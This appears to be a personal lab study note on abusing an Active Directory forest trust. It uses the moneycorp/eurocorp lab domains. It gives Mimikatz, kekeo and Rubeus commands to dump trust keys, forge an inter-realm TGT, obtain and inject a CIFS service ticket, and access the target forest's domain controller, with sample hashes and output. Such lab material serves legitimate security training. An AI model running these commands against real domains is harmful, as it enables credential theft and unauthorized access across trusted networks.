# Abusing Forest Trust to forge TGT ticket
#cross-forest-attack 

Abusing Trust across forest


![[Pasted image 20211010114548.png]]


1. Dump domain controller Trust keys between the 2 different forest (dollarcorp and eurocorp)
```powershell
# in domain controller
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
# [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
# * aes256_hmac       2652c82d0f96d59695f265cf70c7a2e6c08813b3ace70da8b03fcfa939b9c119
# * aes128_hmac       aeb7dc9ad93f5a663aaff587b26efa8d
# * rc4_hmac_nt       a1f36af7856e252495a9116f32d25db5

```

2. Create the inter-realm TGT
```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:a1f36af7856e252495a9116f32d25db5 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'

# Final Ticket Saved to file !
```

3. Get a TGS for service e.g. (CIFS) in the target forest (eurocorp.local)
```powershell
# kekeo_old\asktgs.exe
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local

#* Ticket in file 'CIFS.eurocorp-dc.eurocorp.local.kirbi'
```

4. Present the TGS to the service (CIFS) in the target forest (eurocorp.local)

```powershell
# kekeo_old\kirbirator.exe
.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi

# > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~eurocorp-dc.eurocorp.local@EUROCORP.LOCAL : injected
```

5. Check if we can access service
```powershell
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```


## Alternatively, we can use Rubeus

```powershell
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt

# ServiceName : cifs/eurocorp-dc.eurocorp.local 
# ServiceRealm : EUROCORP.LOCAL 
# UserName : Administrator 
# UserRealm : dollarcorp.moneycorp.local

# check if we can access service
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```